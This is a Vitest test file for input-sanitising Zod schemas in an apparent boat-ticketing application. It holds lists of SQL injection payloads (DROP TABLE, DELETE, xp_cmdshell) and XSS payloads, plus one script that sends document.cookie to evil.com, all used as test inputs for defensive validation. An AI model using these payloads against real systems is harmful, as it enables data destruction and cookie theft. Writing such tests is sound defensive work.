import { describe, it, expect } from "vitest";
import { crearClienteSchema } from "../cliente";
import { crearRutaSchema } from "../ruta";
import { crearEmbarcacionSchema } from "../embarcacion";
import { crearPuertoSchema } from "../puerto";
import { anularVentaSchema } from "../anulacion";

// ============================================================
// PAYLOADS DE ATAQUE
// ============================================================
const SQL_PAYLOADS = [
  "' OR 1=1 --",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "1; DELETE FROM ventas",
  "admin'--",
  "'; EXEC xp_cmdshell('dir'); --",
];

const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  '"><script>alert(document.cookie)</script>',
  '<iframe src="javascript:alert(1)">',
];

// Helper: verifica que un string no contenga caracteres HTML peligrosos sin escapar
function assertSanitized(value: string) {
  expect(value).not.toContain("<");
  expect(value).not.toContain(">");
  expect(value).not.toContain("'");
}

// ============================================================
// Tests: Schema de Cliente con payloads maliciosos
// ============================================================
describe("crearClienteSchema - Protección contra inyección", () => {
  it("sanitiza SQL injection en nombre y apellido", () => {
    for (const payload of SQL_PAYLOADS) {
      const input = {
        dni: "12345678",
        nombre: payload,
        apellido: payload,
      };
      const result = crearClienteSchema.safeParse(input);

      if (result.success) {
        assertSanitized(result.data.nombre);
        assertSanitized(result.data.apellido);
      }
      // Si falla validación (longitud mínima, etc.), también es seguro
    }
  });

  it("sanitiza XSS en nombre y apellido", () => {
    for (const payload of XSS_PAYLOADS) {
      const input = {
        dni: "12345678",
        nombre: payload,
        apellido: payload,
      };
      const result = crearClienteSchema.safeParse(input);

      if (result.success) {
        assertSanitized(result.data.nombre);
        assertSanitized(result.data.apellido);
      }
    }
  });

  it("sanitiza SQL injection en DNI", () => {
    const result = crearClienteSchema.safeParse({
      dni: "' OR 1=1 --",
      nombre: "Juan",
      apellido: "Pérez",
    });

    // Debe fallar porque el DNI queda como "11" (solo dígitos) y es menor a 8
    expect(result.success).toBe(false);
  });

  it("sanitiza email con payloads", () => {
    const result = crearClienteSchema.safeParse({
      dni: "12345678",
      nombre: "Juan",
      apellido: "Pérez",
      email: "admin'--@mail.com",
    });

    // Email con comillas simples no es válido según el schema email
    // El schema puede aceptar o rechazar, pero no habrá inyección
    if (result.success) {
      expect(result.data.email).not.toContain("DROP");
    }
  });

  it("sanitiza teléfono con payloads de inyección", () => {
    const result = crearClienteSchema.safeParse({
      dni: "12345678",
      nombre: "Juan",
      apellido: "Pérez",
      telefono: "'; DELETE FROM users--",
    });

    if (result.success) {
      // El teléfono solo debe contener dígitos
      expect(result.data.telefono).toMatch(/^\d*$/);
    }
  });

  it("sanitiza dirección con HTML malicioso", () => {
    const result = crearClienteSchema.safeParse({
      dni: "12345678",
      nombre: "Juan",
      apellido: "Pérez",
      direccion:
        '<script>document.location="http://evil.com?c="+document.cookie</script>',
    });

    if (result.success) {
      assertSanitized(result.data.direccion!);
    }
  });

  it("acepta datos válidos sin modificarlos innecesariamente", () => {
    const result = crearClienteSchema.safeParse({
      dni: "12345678",
      nombre: "Juan Carlos",
      apellido: "Pérez López",
      telefono: "987654321",
      email: "juan@mail.com",
      direccion: "Jr. Lima 123",
      nacionalidad: "Peruana",
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.nombre).toBe("Juan Carlos");
      expect(result.data.apellido).toBe("Pérez López");
      expect(result.data.dni).toBe("12345678");
    }
  });
});

// ============================================================
// Tests: Schema de Ruta con payloads maliciosos
// ============================================================
describe("crearRutaSchema - Protección contra inyección", () => {
  it("sanitiza SQL injection en nombre de ruta", () => {
    for (const payload of SQL_PAYLOADS) {
      const result = crearRutaSchema.safeParse({
        nombre: payload,
        puertoOrigen: "Iquitos",
        puertoDestino: "Nauta",
        precio: 50,
      });

      if (result.success) {
        assertSanitized(result.data.nombre);
      }
    }
  });

  it("sanitiza XSS en puertos de ruta", () => {
    for (const payload of XSS_PAYLOADS) {
      const result = crearRutaSchema.safeParse({
        nombre: "Ruta Test",
        puertoOrigen: payload,
        puertoDestino: "Nauta",
        precio: 50,
      });

      if (result.success) {
        assertSanitized(result.data.puertoOrigen);
      }
    }
  });

  it("rechaza precios fuera de rango (protección contra manipulación)", () => {
    expect(
      crearRutaSchema.safeParse({
        nombre: "Ruta",
        puertoOrigen: "Iquitos",
        puertoDestino: "Nauta",
        precio: -100,
      }).success,
    ).toBe(false);

    expect(
      crearRutaSchema.safeParse({
        nombre: "Ruta",
        puertoOrigen: "Iquitos",
        puertoDestino: "Nauta",
        precio: 9999,
      }).success,
    ).toBe(false);
  });

  it("rechaza origen igual a destino", () => {
    const result = crearRutaSchema.safeParse({
      nombre: "Ruta Circular",
      puertoOrigen: "Iquitos",
      puertoDestino: "Iquitos",
      precio: 50,
    });

    expect(result.success).toBe(false);
  });
});

// ============================================================
// Tests: Schema de Embarcación con payloads maliciosos
// ============================================================
describe("crearEmbarcacionSchema - Protección contra inyección", () => {
  it("sanitiza SQL injection en nombre de embarcación", () => {
    for (const payload of SQL_PAYLOADS) {
      const result = crearEmbarcacionSchema.safeParse({
        nombre: payload,
        capacidad: 50,
      });

      if (result.success) {
        assertSanitized(result.data.nombre);
      }
    }
  });

  it("sanitiza XSS en nombre de embarcación", () => {
    const result = crearEmbarcacionSchema.safeParse({
      nombre: '<img src=x onerror=alert("xss")>',
      capacidad: 50,
    });

    if (result.success) {
      assertSanitized(result.data.nombre);
    }
  });

  it("rechaza capacidad fuera de rango", () => {
    expect(
      crearEmbarcacionSchema.safeParse({ nombre: "Lancha", capacidad: 0 })
        .success,
    ).toBe(false);

    expect(
      crearEmbarcacionSchema.safeParse({ nombre: "Lancha", capacidad: 501 })
        .success,
    ).toBe(false);
  });

  it("rechaza estados no válidos", () => {
    expect(
      crearEmbarcacionSchema.safeParse({
        nombre: "Lancha",
        capacidad: 50,
        estado: "HACKEADO",
      }).success,
    ).toBe(false);
  });
});

// ============================================================
// Tests: Schema de Puerto con payloads maliciosos
// ============================================================
describe("crearPuertoSchema - Protección contra inyección", () => {
  it("sanitiza SQL injection en nombre de puerto", () => {
    for (const payload of SQL_PAYLOADS) {
      const result = crearPuertoSchema.safeParse({
        nombre: payload,
      });

      if (result.success) {
        assertSanitized(result.data.nombre);
      }
    }
  });

  it("sanitiza XSS en descripción y dirección", () => {
    const result = crearPuertoSchema.safeParse({
      nombre: "Puerto Test",
      descripcion: '<script>alert("xss")</script>',
      direccion: "<img src=x onerror=alert(1)>",
    });

    if (result.success) {
      if (result.data.descripcion) assertSanitized(result.data.descripcion);
      if (result.data.direccion) assertSanitized(result.data.direccion);
    }
  });
});

// ============================================================
// Tests: Schema de Anulación con payloads maliciosos
// ============================================================
describe("anularVentaSchema - Protección contra inyección", () => {
  it("sanitiza SQL injection en motivo de anulación", () => {
    for (const payload of SQL_PAYLOADS) {
      const result = anularVentaSchema.safeParse({
        motivo: payload,
      });

      if (result.success) {
        assertSanitized(result.data.motivo);
      }
    }
  });

  it("sanitiza XSS en observaciones de anulación", () => {
    const result = anularVentaSchema.safeParse({
      motivo: "Cliente solicita cancelación",
      observaciones: '<script>alert("xss")</script>',
    });

    expect(result.success).toBe(true);
    if (result.success && result.data.observaciones) {
      assertSanitized(result.data.observaciones);
    }
  });

  it("rechaza tipos de anulación no válidos", () => {
    expect(
      anularVentaSchema.safeParse({
        motivo: "Cancelación",
        tipoAnulacion: "HACK",
      }).success,
    ).toBe(false);
  });

  it("acepta datos válidos correctamente", () => {
    const result = anularVentaSchema.safeParse({
      motivo: "El cliente cambió de planes",
      observaciones: "Se contactó por teléfono",
      tipoAnulacion: "REEMBOLSO",
      montoReembolso: 50.0,
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.motivo).toBe("El cliente cambió de planes");
      expect(result.data.tipoAnulacion).toBe("REEMBOLSO");
      expect(result.data.montoReembolso).toBe(50.0);
    }
  });
});
